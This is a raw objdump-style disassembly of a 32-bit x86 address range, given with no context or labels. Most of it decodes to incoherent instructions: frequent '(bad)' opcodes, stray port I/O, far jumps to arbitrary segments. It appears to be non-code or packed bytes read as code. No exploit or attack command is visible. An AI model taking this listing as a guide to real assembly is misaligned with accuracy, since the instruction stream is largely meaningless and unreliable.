  426bac:	test   BYTE PTR [ecx-0x3a],dl
  426baf:	sub    DWORD PTR [eax+0x35],eax
  426bb2:	lods   eax,DWORD PTR ds:[esi]
  426bb3:	das    
  426bb4:	jle    0x426c1c
  426bb6:	adc    edi,DWORD PTR [edx-0x45]
  426bb9:	in     al,dx
  426bba:	(bad)  
  426bbb:	jmp    0xaf6c:0x98420b
  426bc2:	aaa    
  426bc3:	xor    eax,DWORD PTR [edi+eiz*2]
  426bc6:	and    al,ch
  426bc8:	pop    ebp
  426bc9:	mov    bh,0xc5
  426bcb:	fs inc edi
  426bcd:	lods   al,BYTE PTR ds:[esi]
  426bce:	out    0x59,eax
  426bd0:	add    BYTE PTR [esi-0x4f3b0226],bl
  426bd6:	fiadd  WORD PTR [edx-0x22bece80]
  426bdc:	inc    edi
  426bdd:	push   edx
  426bde:	mov    ah,BYTE PTR [ebp-0x11]
  426be1:	inc    eax
  426be2:	test   BYTE PTR ds:0x6779f438,0xcf
  426be9:	and    BYTE PTR [ebp-0x1a6959da],bh
  426bef:	add    al,0xf8
  426bf1:	or     DWORD PTR [eax-0x70],eax
  426bf4:	repnz dec ecx
  426bf6:	int3   
  426bf7:	xor    BYTE PTR [eax+0x354265d0],ah
  426bfd:	cdq    
  426bfe:	mov    ds:0x1bc587a3,eax
  426c03:	and    DWORD PTR [eax],0x66
  426c06:	and    DWORD PTR [ebx],ebp
  426c08:	fmulp  st(1),st
  426c0a:	or     eax,0x71e55b8c
  426c0f:	test   al,0x2b
  426c11:	fwait
  426c12:	jge    0x426c1b
  426c14:	push   0xffffff9b
  426c16:	mov    ax,ds:0xdfd8d12
  426c1c:	imul   esi,ebx,0xffffffd9
  426c1f:	pop    edi
  426c20:	push   es
  426c21:	mov    eax,0x38b7f82e
  426c26:	(bad)  
  426c27:	data16 cmp bh,BYTE PTR [esi+0x58]
  426c2b:	mov    eax,ds:0xb49b2f33
  426c30:	scas   eax,DWORD PTR es:[edi]
  426c31:	retf   0x7ae8
  426c34:	push   esp
  426c35:	xor    DWORD PTR [edx],ebx
  426c37:	mov    cs,WORD PTR [edx+0x64]
  426c3a:	lock jmp 0x426c11
  426c3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426c3e:	sub    dh,dh
  426c40:	iret   
  426c41:	loopne 0x426c57
  426c43:	or     eax,0x80af987d
  426c48:	in     al,0x58
  426c4a:	push   edi
  426c4b:	cmp    DWORD PTR [ebx+0x44],esp
  426c4e:	cmp    al,al
  426c50:	stos   DWORD PTR es:[edi],eax
  426c51:	mov    ah,0x8a
  426c53:	xchg   BYTE PTR [edi],cl
  426c55:	jle    0x426be8
  426c57:	imul   eax,DWORD PTR [ebx-0x6792149e],0x66777daa
  426c61:	cmc    
  426c62:	jne    0x426bf7
  426c64:	aas    
  426c65:	inc    ebx
  426c66:	retf   
  426c67:	sbb    ecx,DWORD PTR [esi+0x6717d5d3]
  426c6d:	sub    DWORD PTR [ebx-0x6736aa8f],ebp
  426c73:	xchg   esp,eax
  426c74:	clc    
  426c75:	lods   al,BYTE PTR ds:[esi]
  426c76:	idiv   DWORD PTR [esi-0x33c850d]
  426c7c:	mov    ds:0xcdc453ac,al
  426c81:	or     eax,0x5d541f38
  426c86:	sbb    al,0x71
  426c88:	repnz cmc 
  426c8a:	dec    edx
  426c8b:	popf   
  426c8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426c8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426c8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426c8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426c90:	dec    ecx
  426c91:	inc    edi
  426c92:	in     al,0x59
  426c94:	add    esp,ecx
  426c96:	or     BYTE PTR [edi+eax*2-0x45],ch
  426c9a:	xchg   ebx,eax
  426c9b:	pop    ecx
  426c9c:	pop    es
  426c9d:	mov    dh,0xba
  426c9f:	cmp    al,0x44
  426ca1:	xor    eax,0xd1285c9
  426ca6:	pusha  
  426ca7:	mov    al,0x40
  426ca9:	outs   dx,DWORD PTR ds:[esi]
  426caa:	mov    dl,0xd6
  426cac:	das    
  426cad:	mov    fs,WORD PTR [ebx-0x24]
  426cb0:	loope  0x426c3d
  426cb2:	out    0x38,eax
  426cb4:	sti    
  426cb5:	jnp    0x426c98
  426cb7:	mov    ds:0x120fb5bf,eax
  426cbc:	cs cld 
  426cbe:	lock mov eax,0x1aa2bdcd
  426cc4:	mov    ah,0xbe
  426cc6:	in     al,0xb4
  426cc8:	not    BYTE PTR [ecx]
  426cca:	mov    ds:0x97e2778e,eax
  426ccf:	gs ret 
  426cd1:	adc    ebp,esp
  426cd3:	and    al,0x5
  426cd5:	mov    edx,0xd5fd8d2a
  426cda:	imul   ebp,DWORD PTR cs:[eax+0x13],0xe6e0d41
  426ce2:	(bad)  
  426ce3:	sbb    ebp,DWORD PTR [edi]
  426ce5:	fs jle 0x426cfa
  426ce8:	call   0xe8dd:0x7b2251b5
  426cef:	out    0xf3,eax
  426cf1:	adc    eax,0xbc7f31ba
  426cf6:	imul   ebp,DWORD PTR [esi+0x7c],0xfffffff8
  426cfa:	push   0x1cef2503
  426cff:	test   BYTE PTR [eax],al
  426d01:	xor    ecx,DWORD PTR [ebx]
  426d03:	xor    edx,DWORD PTR [esi]
  426d05:	jp     0x426cbc
  426d07:	jmp    0x15c27e32
  426d0c:	ret    
  426d0d:	or     edx,DWORD PTR [ebp-0x15]
  426d10:	lods   al,BYTE PTR ds:[esi]
  426d11:	int3   
  426d12:	pop    esi
  426d13:	les    edx,FWORD PTR [ecx-0x2e75cec8]
  426d19:	jecxz  0x426d5b
  426d1b:	add    esp,0xffffffcf
  426d1e:	cmp    al,al
  426d20:	test   al,0x2f
  426d22:	jmp    0x426d34
  426d24:	arpl   WORD PTR [edi],dx
  426d26:	rcl    BYTE PTR [edx+eiz*1+0xd],0x8f
  426d2b:	add    DWORD PTR [ecx],0xffffff94
  426d2e:	xor    ebx,0xffffffb3
  426d31:	cmp    al,BYTE PTR [edi]
  426d33:	dec    eax
  426d34:	push   ss
  426d35:	cmp    eax,0xf80db93b
  426d3a:	retf   0x1ef6
  426d3d:	repz xor ch,0xe9
  426d41:	push   esp
  426d42:	les    edx,FWORD PTR [ebp+0x2ead8a42]
  426d48:	mov    edx,0xb54fb75
  426d4d:	fidivr DWORD PTR [edx-0xc5e8f48]
  426d53:	dec    esp
  426d54:	mov    ds:0xc3ca191f,eax
  426d59:	xchg   ebp,eax
  426d5a:	cmp    eax,0xfc383fde
  426d5f:	push   ebx
  426d60:	jae    0x426d9b
  426d62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426d63:	mov    edi,0xa6967ad9
  426d68:	mov    edx,0x66ed6e2c
  426d6d:	(bad)  
  426d6e:	mov    ebp,0xe9227909
  426d73:	in     eax,dx
  426d74:	sub    esi,ebx
  426d76:	pop    ds
  426d77:	and    al,0x8b
  426d79:	les    ebp,FWORD PTR [esi+0x20]
  426d7c:	and    ecx,edi
  426d7e:	out    dx,al
  426d7f:	adc    ch,BYTE PTR [edx-0xf]
  426d82:	xor    DWORD PTR [ecx-0x33],edi
  426d85:	daa    
  426d86:	mov    ah,0x2e
  426d88:	mov    ebp,0x6717109a
  426d8d:	dec    edx
  426d8e:	stos   BYTE PTR es:[edi],al
  426d8f:	int3   
  426d90:	cmp    ah,ah
  426d92:	mov    ch,0xc2
  426d94:	(bad)  
  426d95:	pop    esp
  426d96:	inc    esi
  426d97:	ficom  WORD PTR [edx-0x26a2eff0]
  426d9d:	jmp    0x177e6d65
  426da2:	mov    edi,DWORD PTR ds:0x80f9a312
  426da8:	mov    cl,0x35
  426daa:	mov    eax,ds:0x5b8240ae
  426daf:	sub    BYTE PTR [esi],ch
  426db1:	call   0x506da345
  426db6:	out    dx,al
  426db7:	pop    ss
  426db8:	test   dl,ch
  426dba:	and    BYTE PTR [ecx+esi*4],bl
  426dbd:	test   eax,0x5f921a8
  426dc2:	sub    DWORD PTR [edi],ecx
  426dc4:	mov    WORD PTR [edi],?
  426dc6:	iret   
  426dc7:	out    dx,al
  426dc8:	mov    ebx,0xb1d546a
  426dcd:	sbb    DWORD PTR [ebx-0x1b],edi
  426dd0:	ret    0x7ba0
  426dd3:	and    DWORD PTR [ebx-0x2b1f5356],0x7cbebb82
  426ddd:	inc    esi
  426dde:	icebp  
  426ddf:	ds inc esp
  426de1:	cmp    BYTE PTR [esi+0x4e74d573],dl
  426de7:	dec    esp
  426de8:	mov    edi,0xb7c79b03
  426ded:	lock (bad) 
  426def:	sbb    al,BYTE PTR [esi]
  426df1:	jle    0x426e03
  426df3:	add    dl,BYTE PTR [ebx+0xd1ab1be]
  426df9:	lea    edx,[edi+0x1b3bca11]
  426dff:	(bad)  
  426e00:	(bad)  
  426e01:	push   edx
  426e03:	loope  0x426e75
  426e05:	clc    
  426e06:	loop   0x426e7a
  426e08:	lods   al,BYTE PTR ds:[esi]
  426e09:	mov    dh,0x3b
  426e0b:	xor    edi,0xb52f4be0
  426e11:	mov    ebx,0x98240f76
  426e16:	push   0xd94cef4e
  426e1b:	adc    bl,BYTE PTR [ebp+eax*1-0x25]
  426e1f:	pop    ss
  426e20:	mov    esi,esp
  426e22:	xlat   BYTE PTR ds:[ebx]
  426e23:	pop    es
  426e24:	nop
  426e25:	push   ebp
  426e26:	mov    esp,0xae60d07c
  426e2b:	js     0x426de4
  426e2d:	mov    edx,0xe5fa7668
  426e32:	rcr    BYTE PTR [edx-0x39],0x6e
  426e36:	je     0x426e3c
  426e38:	adc    ah,BYTE PTR [eax]
  426e3a:	push   0x25d61a15
  426e3f:	into   
  426e40:	out    0xc9,al
  426e42:	dec    esi
  426e43:	mov    al,ds:0xfb732392
  426e48:	inc    edx
  426e49:	test   eax,0x86b60f15
  426e4e:	(bad)  
  426e4f:	call   0xa0599c03
  426e54:	in     eax,0xd8
  426e56:	sbb    DWORD PTR [edx],edi
  426e58:	fst    DWORD PTR ds:0x91412d81
  426e5e:	pop    esi
  426e5f:	pop    edi
  426e60:	mov    ebp,0xd2dd5eff
  426e65:	or     DWORD PTR [ecx+0x4f9b5d14],0x5d8ef026
  426e6f:	pushf  
  426e70:	jmp    0xce290cd
  426e75:	mov    esi,0xc933489d
  426e7a:	lea    ebx,[edi-0x1b2877ee]
  426e80:	das    
  426e81:	loope  0x426e38
  426e83:	and    DWORD PTR [eax],edi
  426e85:	fnstenv [esp+ebx*2+0x6069451a]
  426e8c:	jae    0x426e6a
  426e8e:	xor    edi,DWORD PTR [ecx+0x4b]
  426e91:	shr    BYTE PTR [esi],1
  426e93:	out    dx,al
  426e94:	lea    esi,[edx+0x5e217813]
  426e9a:	jge    0x426edb
  426e9c:	icebp  
  426e9d:	adc    eax,0x259dc676
  426ea2:	sbb    eax,0x667e31f3
  426ea7:	mov    DWORD PTR [ecx+0x24f54a53],0xd69c538
  426eb1:	jno    0x426efd
  426eb3:	and    ecx,DWORD PTR [ecx-0x18]
  426eb6:	cwde   
  426eb7:	retf   0x679e
  426eba:	lock lea edi,[ebx+ecx*2-0x1387b05]
  426ec2:	stc    
  426ec3:	cld    
  426ec4:	test   al,0x29
  426ec6:	into   
  426ec7:	cmp    BYTE PTR ds:[ebx-0x3795d7b1],dh
  426ece:	inc    esi
  426ecf:	mov    ebx,0x90bcc3ab
  426ed4:	sahf   
  426ed5:	call   0xac1c:0x62056fa6
  426edc:	or     cl,ah
  426ede:	out    0x12,eax
  426ee0:	lock cmp al,0xf7
  426ee3:	bound  ebp,QWORD PTR ds:0xe667ecda
  426ee9:	push   es
  426eea:	inc    ecx
  426eeb:	xor    BYTE PTR [ecx+0x53e1fedb],0xdd
  426ef2:	fidiv  WORD PTR [ebp-0x57e08557]
  426ef8:	xor    al,0xaa
  426efa:	lods   al,BYTE PTR ds:[esi]
  426efb:	xor    edx,eax
  426efd:	mov    ds:0xb9df2bd9,eax
  426f02:	bound  esi,QWORD PTR [ebx-0x1171fdbc]
  426f08:	aad    0x51
  426f0a:	bound  esi,QWORD PTR [ebp+0x510b900]
  426f10:	repnz imul eax,DWORD PTR [ebx+0xa],0xffffffed
  426f15:	fwait
  426f16:	sbb    ah,bh
  426f18:	ret    
  426f19:	mov    BYTE PTR [edx-0x6d090a59],ch
  426f1f:	or     cl,BYTE PTR [edx]
  426f21:	fs inc edi
  426f23:	inc    eax
  426f24:	jl     0x426eb8
  426f26:	add    ebx,DWORD PTR ds:[ebp-0x60b7f916]
  426f2d:	mov    ds:0x97bef8bb,eax
  426f32:	pop    ebx
  426f33:	ret    0x78ed
  426f36:	mov    ds:0x6a7e622c,al
  426f3b:	ja     0x426f78
  426f3d:	cmc    
  426f3e:	adc    dh,bl
  426f40:	mov    ds,ebx
  426f42:	push   0xefbef5b6
  426f47:	nop
  426f48:	jmp    0xdd64:0x1731bc51
  426f4f:	enter  0x26e0,0x54
  426f53:	xchg   ecx,eax
  426f54:	lock aam 0x87
  426f57:	lahf   
  426f58:	scas   al,BYTE PTR es:[edi]
  426f59:	fwait
  426f5a:	jne    0x426f20
  426f5c:	je     0x426f0d
  426f5e:	imul   esi,ebp,0xffffffbd
  426f61:	inc    ebx
  426f62:	dec    edi
  426f63:	inc    edi
  426f64:	call   0xff1b:0x751270f6
  426f6b:	add    ebp,DWORD PTR [esi]
  426f6d:	cmp    DWORD PTR [ecx-0x1eac8a8],esp
  426f73:	iret   
  426f74:	inc    ebp
  426f75:	popf   
  426f76:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  426f78:	outs   dx,DWORD PTR ds:[esi]
  426f79:	sub    bl,dl
  426f7b:	ror    esi,cl
  426f7d:	out    dx,al
  426f7e:	cmp    DWORD PTR [ebp+0xf],0x576a7ff
  426f85:	inc    edx
  426f86:	mov    ds:0xf5c03585,al
  426f8b:	adc    ah,BYTE PTR [ebx+0x43]
  426f8e:	in     eax,0xec
  426f90:	jmp    0x426fb6
  426f92:	(bad)  
  426f94:	bound  esp,QWORD PTR [esi-0x2647a5e2]
  426f9a:	mov    esp,DWORD PTR ss:[esi+0x67]
  426f9e:	inc    eax
  426f9f:	cmc    
  426fa0:	fistp  WORD PTR [ebx]
  426fa2:	out    dx,al
  426fa3:	rol    DWORD PTR [eax+0x6c],cl
  426fa6:	lahf   
  426fa7:	sub    eax,0x5d092f11
  426fac:	mov    ch,0xdb
  426fae:	data16 idiv BYTE PTR [esi-0x13930acc]
  426fb5:	std    
  426fb6:	fidiv  DWORD PTR [edx+0x9]
  426fb9:	mov    WORD PTR [edi],fs
  426fbb:	out    dx,al
  426fbc:	dec    edx
  426fbd:	test   eax,0xf62a3c3b
  426fc2:	dec    edi
  426fc3:	(bad)  
  426fc4:	cmp    dh,BYTE PTR [edx]
  426fc6:	cmp    dh,BYTE PTR [esi]
  426fc8:	rol    DWORD PTR ds:[edx],1
  426fcb:	in     eax,dx
  426fcc:	(bad)  
  426fcd:	or     eax,0xfca24e17
  426fd2:	lods   al,BYTE PTR ds:[esi]
  426fd3:	(bad)
  426fd6:	push   ebp
  426fd7:	test   al,0xa5
  426fd9:	and    eax,esp
  426fdb:	jns    0x427022
  426fdd:	push   ds
  426fde:	sub    edi,DWORD PTR ds:0x1146f6ae
  426fe4:	lods   eax,DWORD PTR ds:[esi]
  426fe5:	test   bl,dl
  426fe7:	adc    BYTE PTR [edx+0x3b],0xbe
  426feb:	int    0xc0
  426fed:	xchg   esi,eax
  426fee:	out    dx,al
  426fef:	pop    ebp
  426ff0:	jge    0x426f99
  426ff2:	das    
  426ff3:	(bad)  
  426ff4:	cwde   
  426ff5:	mov    dh,0xbb
  426ff7:	cmp    DWORD PTR [ecx],edi
  426ff9:	sub    eax,0x4cce41e3
  426ffe:	(bad)  
  426fff:	fisubr WORD PTR [eax]
  427001:	xchg   ebx,eax
  427002:	out    0x64,eax
  427004:	pop    eax
  427005:	xchg   ebp,eax
  427006:	imul   ebp,DWORD PTR [edx],0xffffffe0
  427009:	fs ss mov ebx,0xd76f6dbd
  427010:	stc    
  427011:	aaa    
  427012:	cmp    DWORD PTR [edi+0x6b1af09c],0xb2694dce
  42701c:	stos   DWORD PTR es:[edi],eax
  42701d:	push   ss
  42701e:	out    dx,al
  42701f:	fdivr  QWORD PTR [ecx*1-0x3508b1b6]
  427026:	push   ecx
  427027:	add    eax,0xa6e510f5
  42702c:	xchg   ebp,eax
  42702d:	mov    dl,0xea
  42702f:	push   0x4c
  427031:	loope  0x426ff9
  427033:	jmp    0x60eaffd2
  427038:	mov    DWORD PTR [ecx-0x4d96d7bc],edx
  42703e:	push   ebx
  42703f:	sti    
  427040:	push   esp
  427041:	or     DWORD PTR [esi],edx
  427043:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427044:	mov    ds:0x9b957d85,eax
  427049:	sub    al,0xfe
  42704b:	out    dx,eax
  42704c:	mov    ebx,0xf7a3acfc
  427051:	inc    edx
  427052:	das    
  427053:	mov    ebx,0x19c94d1e
  427058:	adc    eax,0x8c5777
  42705d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42705e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42705f:	mov    ch,0x5d
  427061:	into   
  427062:	sub    dh,cl
  427064:	mov    al,0xc9
  427066:	hlt    
  427067:	jns    0x427038
  427069:	std    
  42706a:	ins    BYTE PTR es:[edi],dx
  42706b:	add    BYTE PTR [eax-0x79207137],bh
  427071:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427072:	dec    edx
  427073:	loopne 0x427085
  427075:	fucomi st,st(2)
  427077:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427078:	shr    ecx,cl
  42707a:	dec    edx
  42707b:	outs   dx,DWORD PTR ds:[esi]
  42707c:	inc    edi
  42707d:	test   eax,0x81746372
  427082:	sti    
  427083:	cmp    BYTE PTR [edi+0x80e1af5],bh
  427089:	push   es
  42708a:	mov    edx,0x903da5e
  42708f:	push   ebx
  427090:	cmp    esp,DWORD PTR [ecx]
  427092:	or     al,BYTE PTR [ecx-0x10]
  427095:	jae    0x42701f
  427097:	lods   al,BYTE PTR ds:[esi]
  427098:	xchg   esp,eax
  427099:	stc    
  42709a:	es pop ebp
  42709c:	push   0xffffff97
  42709e:	stos   BYTE PTR es:[edi],al
  42709f:	call   0xac63:0x465d79bd
  4270a6:	pusha  
  4270a7:	stc    
  4270a8:	out    dx,eax
  4270a9:	shl    BYTE PTR [edi],cl
  4270ab:	iret   
  4270ac:	daa    
  4270ad:	outs   dx,BYTE PTR ds:[esi]
  4270ae:	loope  0x427030
  4270b0:	test   BYTE PTR [ecx],ch
  4270b2:	(bad)  
  4270b3:	xchg   ebp,eax
  4270b4:	ds (bad) 
  4270b6:	mov    ebp,0xdd2ce45
  4270bb:	pop    esp
  4270bc:	ins    BYTE PTR es:[edi],dx
  4270bd:	inc    esp
  4270be:	cmp    edx,DWORD PTR [eax-0x49588ab4]
  4270c4:	sbb    al,0x14
  4270c6:	dec    ebx
  4270c7:	or     eax,0xb704907a
  4270cc:	add    ecx,DWORD PTR [ecx]
  4270ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4270cf:	ss jl  0x4270e9
  4270d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4270d3:	dec    esp
  4270d4:	scas   eax,DWORD PTR es:[edi]
  4270d5:	int    0xc6
  4270d7:	in     eax,0x32
  4270d9:	add    DWORD PTR [edi+0x64d92c2a],0x5f814905
  4270e3:	dec    eax
  4270e4:	and    ah,dh
  4270e6:	push   ds
  4270e7:	mov    BYTE PTR [ebx],ch
  4270e9:	repz mov al,ds:0xec911fec
  4270ef:	test   eax,0x5140b800
  4270f4:	(bad)  
  4270f5:	dec    ebp
  4270f6:	mov    eax,0x47b6bb46
  4270fb:	lds    esp,FWORD PTR [ebx-0x13]
  4270fe:	xor    al,0x61
  427100:	dec    esp
  427101:	cwde   
  427102:	or     ah,BYTE PTR [ebx-0x37f1d177]
  427108:	ds enter 0xc147,0xb6
  42710d:	outs   dx,BYTE PTR ds:[esi]
  42710e:	test   eax,0x873d9278
  427113:	and    esp,DWORD PTR [ebx-0x390c6e7e]
  427119:	jmp    0x713b0a0
  42711e:	out    0x24,al
  427120:	outs   dx,BYTE PTR ds:[esi]
  427121:	push   0xffffffef
  427123:	daa    
  427124:	and    BYTE PTR [eax],bl
  427126:	or     esi,DWORD PTR [esi-0x3]
  427129:	or     eax,0xacb57fbc
  42712e:	push   ebp
  42712f:	mov    eax,ds:0x981525be
  427134:	lods   al,BYTE PTR ds:[esi]
  427135:	cmp    DWORD PTR [esp+ecx*4-0x78],0x42f107ad
  42713d:	nop
  42713e:	loop   0x4271bb
  427140:	fsub   QWORD PTR [eax+0x226a3181]
  427146:	jp     0x42718c
  427148:	dec    edi
  427149:	out    dx,eax
  42714a:	enter  0xdd2c,0x4d
  42714e:	mov    ds:0xe5be1f4f,al
  427153:	mov    BYTE PTR [ecx-0x16],al
  427156:	inc    eax
  427157:	ss ja  0x42718b
  42715a:	loop   0x4271d1
  42715c:	std    
  42715d:	pop    ebp
  42715e:	cmp    ch,BYTE PTR [ebx-0x69]
  427161:	aaa    
  427162:	out    dx,eax
  427163:	stos   DWORD PTR es:[edi],eax
  427164:	jb     0x4271d3
  427166:	ret    
  427167:	shl    BYTE PTR [esp+ecx*2-0x30],cl
  42716b:	in     eax,0x30
  42716d:	pop    edx
  42716e:	pop    edx
  42716f:	stos   DWORD PTR es:[edi],eax
  427170:	(bad)  
  427171:	int3   
  427172:	dec    esp
  427173:	and    edx,DWORD PTR [edi]
  427175:	sbb    BYTE PTR [ecx-0x48e391fe],bl
  42717b:	sbb    eax,0x8514575c
  427180:	mov    dh,0x29
  427182:	cmp    DWORD PTR [esi+0x4f],ecx
  427185:	(bad)  
  427186:	ja     0x42719e
  427188:	call   ebp
  42718a:	clc    
  42718b:	mov    al,0xf1
  42718d:	ret    
  42718e:	add    al,al
  427190:	mov    dh,0x49
  427192:	cmp    BYTE PTR [ebp+0x69],bl
  427195:	jno    0x427131
  427197:	fwait
  427198:	xor    DWORD PTR [ebx+0xf],esi
  42719b:	jl     0x42715e
  42719d:	(bad)  
  42719e:	iret   
  42719f:	xor    al,0x9b
  4271a1:	data16 fsubp st(6),st
  4271a4:	sbb    cl,ch
  4271a6:	mov    ah,0xe1
  4271a8:	push   esi
  4271a9:	in     eax,0xc8
  4271ab:	and    BYTE PTR [ecx],ch
  4271ad:	mov    ch,0x98
  4271af:	ret    0x3609
  4271b2:	xchg   esi,eax
  4271b3:	jmp    0x28d1e591
  4271b8:	lods   al,BYTE PTR ds:[esi]
  4271b9:	and    eax,0x896fbefe
  4271be:	lods   al,BYTE PTR ds:[esi]
  4271bf:	mov    ebp,0x7c93c27e
  4271c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4271c5:	cmp    DWORD PTR [ecx-0x6fcac24a],esi
  4271cb:	adc    edx,DWORD PTR [ebp-0x3459b2e9]
  4271d1:	xlat   BYTE PTR ds:[ebx]
  4271d2:	or     cl,BYTE PTR [edx]
  4271d4:	fs (bad) 
  4271d6:	jbe    0x4271c7
  4271d8:	lea    esi,[esi]
  4271da:	mov    eax,ds:0xe3ed795c
  4271df:	jle    0x4271b1
  4271e1:	sbb    BYTE PTR [esi-0x7b],0xab
  4271e5:	int3   
  4271e6:	push   edi
  4271e7:	sbb    BYTE PTR [ecx],dl
  4271e9:	out    dx,al
  4271ea:	adc    eax,0x728c0c99
  4271ef:	lea    esi,[ebx+0x2b0a8ba2]
  4271f5:	test   eax,0x957adf96
  4271fa:	jae    0x427220
  4271fc:	cmp    esi,esp
  4271fe:	inc    ebx
  4271ff:	std    
  427200:	pop    edi
  427201:	inc    esp
  427202:	dec    eax
  427203:	adc    ah,BYTE PTR ds:0x302a0866
  427209:	pop    eax
  42720a:	mov    ch,0x8c
  42720c:	dec    esp
  42720d:	jno    0x427246
  42720f:	pop    eax
  427210:	and    DWORD PTR [ebx],0xffffffed
  427213:	adc    ch,bl
  427215:	rcr    DWORD PTR [edx-0x18],1
  427218:	fist   WORD PTR [ebx+0x1d]
  42721b:	xchg   esi,eax
  42721c:	mov    ebp,0x8cfd4e9b
  427221:	sub    cl,ah
  427223:	outs   dx,DWORD PTR ds:[esi]
  427224:	mov    cl,0x0
  427226:	add    BYTE PTR [eax],al
  427228:	add    BYTE PTR [eax],al
  42722a:	dec    ebp
  42722b:	push   ebp
  42722c:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  427232:	mov    esp,ebp
  427234:	or     al,ah
  427236:	dec    ebp
  427237:	add    bh,al
  427239:	add    BYTE PTR [eax],cl
  42723b:	add    BYTE PTR [eax],al
  42723d:	mov    DWORD PTR [eax],0x3ef44545
  427243:	cmp    BYTE PTR [eax],al
  427245:	test   DWORD PTR [ebx-0x34070b64],ecx
  42724b:	(bad)  
  42724c:	enter  0x4d45,0xb8
  427250:	mov    edi,DWORD PTR [ecx]
  427252:	hlt    
  427253:	test   ebx,ecx
  427255:	pushf  
  427256:	enter  0x4df8,0x8b
  42725a:	mov    DWORD PTR [ebp+0x8],0x894708
  427261:	inc    ebp
  427262:	mov    ebp,0xff8bfffc
  427267:	dec    ebp
  427268:	mov    ch,0xf4
  42726a:	call   DWORD PTR [ebx-0x1]
  42726d:	mov    ebx,0x8005022
  427272:	call   DWORD PTR [ecx+0x8]
  427275:	pop    es
  427276:	jmp    0xb8:0x9cb4533
  42727d:	cwde   
  42727e:	mov    esi,DWORD PTR [edx-0xc]
  427281:	xor    al,bl
  427283:	add    BYTE PTR [eax+0x3c83203],bl
  427289:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  42728f:	mov    eax,DWORD PTR [ebx-0xb87b3]
  427295:	xor    eax,DWORD PTR [eax]
  427297:	retf   
  427298:	ret    
  427299:	add    eax,esi
  42729b:	enter  0x8945,0x64
  42729f:	dec    ebp
  4272a0:	sbb    ah,cl
  4272a2:	add    BYTE PTR [ebx-0xb87b277],cl
  4272a8:	dec    DWORD PTR [ebx-0xbcfb275]
  4272ae:	test   DWORD PTR [ebx],esi
  4272b0:	dec    ebx
  4272b2:	inc    DWORD PTR [ebx]
  4272b4:	inc    eax
  4272b5:	enter  0x8989,0x64
  4272b9:	(bad)  
  4272ba:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  4272be:	cld    
  4272bf:	dec    DWORD PTR [ebp-0xa90001]
  4272c5:	push   edi
  4272c6:	mov    BYTE PTR [edx+0x1],ch
  4272c9:	and    BYTE PTR [eax],al
  4272cb:	pop    ecx
  4272cc:	inc    ebp
  4272cd:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  4272d3:	push   0xffffff89
  4272d5:	pop    ecx
  4272d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4272d7:	dec    ebp
  4272d8:	add    BYTE PTR [ecx+0x45fc088b],cl
  4272de:	jne    0x427328
  4272e0:	lea    eax,[eax]
  4272e2:	fs (bad) 
  4272e4:	dec    DWORD PTR [eax]
  4272e6:	mov    DWORD PTR [eax],eax
  4272e8:	test   al,0x0
  4272ea:	add    BYTE PTR [ebp-0x18],cl
  4272ed:	xor    ebp,DWORD PTR [edx]
  4272ef:	add    eax,DWORD PTR [eax]
  4272f1:	mov    eax,eax
  4272f3:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4272fa:	inc    ebp
  4272fb:	mov    DWORD PTR [ebx+0x459408],ecx
  427301:	popa   
  427302:	mov    esp,DWORD PTR [ebp-0x75]
  427305:	(bad)  
  427306:	cld    
  427307:	inc    eax
  427308:	cmp    bh,0x1
  42730b:	lea    eax,[eax]
  42730d:	and    BYTE PTR [eax],al
  42730f:	inc    DWORD PTR [ecx-0x18]
  427312:	mov    ecx,DWORD PTR [ebx]
  427314:	cld    
  427315:	add    BYTE PTR [ecx+0x75014d],cl
  42731b:	(bad)  
  42731c:	xchg   ebp,eax
  42731d:	sar    bh,1
  42731f:	inc    eax
  427320:	inc    DWORD PTR [eax]
  427322:	mov    eax,DWORD PTR [ebp-0x4]
  427325:	xor    edx,DWORD PTR [edx+0x7201be]
  42732b:	add    BYTE PTR [edx],dl
  42732d:	(bad)  
  42732e:	nop
  42732f:	inc    ebp
  427330:	add    BYTE PTR [ebx-0x5afb0c00],cl
  427336:	mov    al,0xff
  427338:	add    bh,bh
  42733a:	add    BYTE PTR [ebx],dh
  42733c:	inc    DWORD PTR [ebx]
  42733e:	sbb    al,0x89
  427340:	jne    0x42731e
  427342:	mov    esp,DWORD PTR [ecx+0x4500fc]
  427348:	mov    eax,DWORD PTR [ebp-0xff0048]
  42734e:	mov    DWORD PTR [eax-0x70],0xee70ed89
  427355:	inc    DWORD PTR [ebp-0x75]
  427358:	fisttp QWORD PTR [eax+ebp*8]
  42735b:	test   DWORD PTR [esi-0x1],esp
  42735e:	inc    ebp
  42735f:	(bad)  
  427360:	aas    
  427361:	inc    ebp
  427362:	(bad)  
  427363:	lea    edi,[eax+edi*2-0x1]
  427367:	inc    edi
  427369:	mov    DWORD PTR ds:0x8000c7a0,edi
  42736f:	mov    ebp,esi
  427371:	cld    
  427372:	in     al,0x8d
  427374:	inc    ebp
  427375:	(bad)  
  427376:	call   0xc7cb537a
  42737b:	add    DWORD PTR [eax-0x11ba1500],ecx
  427381:	inc    DWORD PTR [ebp-0x4]
  427384:	out    0x8d,eax
  427386:	aas    
  427387:	(bad)  
  427388:	call   0xca9e8c
  42738d:	add    DWORD PTR [ebx-0x7f570400],ecx
  427393:	add    BYTE PTR [ecx],al
  427395:	test   DWORD PTR [eax],eax
  427397:	wrmsr  
  427399:	jae    0x427388
